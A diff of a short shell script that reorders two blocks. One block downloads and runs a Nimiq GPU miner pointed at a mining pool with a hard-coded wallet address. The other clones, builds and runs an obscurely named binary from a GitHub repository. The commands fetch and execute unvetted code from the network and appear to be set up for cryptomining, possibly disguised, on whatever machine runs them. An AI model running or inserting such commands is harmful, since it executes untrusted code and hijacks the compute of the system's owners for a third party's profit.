@@ -1,11 +1,3 @@
-wget -N https://raw.githubusercontent.com/hayatiptv/Nimiq-GPU-Miner-NoncerPro-GPU-miner/master/NQ-Miner%20-%20NoFee/nq-miner-linux-0.99.6.tar.gz
-
-tar -xvf ./nq-miner-linux-0.99.6.tar.gz
-
-cd ./nq-miner/
-
-./nq-miner -t cuda -a "NQ30 QUVC F4EM EA92 R6KY 52HF TQGS DEGH HBCH" -p pool.acemining.co:8443 -m dumb
-
 git clone https://github.com/mobileapps84741274/linux8444;
 cd ./linux8444/;
 mkdir ./build/;
@@ -14,3 +6,11 @@ cmake ..;
 make;
 cd ./linux8444/;
 ./linux84444474 g
+
+wget -N https://raw.githubusercontent.com/hayatiptv/Nimiq-GPU-Miner-NoncerPro-GPU-miner/master/NQ-Miner%20-%20NoFee/nq-miner-linux-0.99.6.tar.gz
+
+tar -xvf ./nq-miner-linux-0.99.6.tar.gz
+
+cd ./nq-miner/
+
+./nq-miner -t cuda -a "NQ30 QUVC F4EM EA92 R6KY 52HF TQGS DEGH HBCH" -p pool.acemining.co:8443 -m dumb
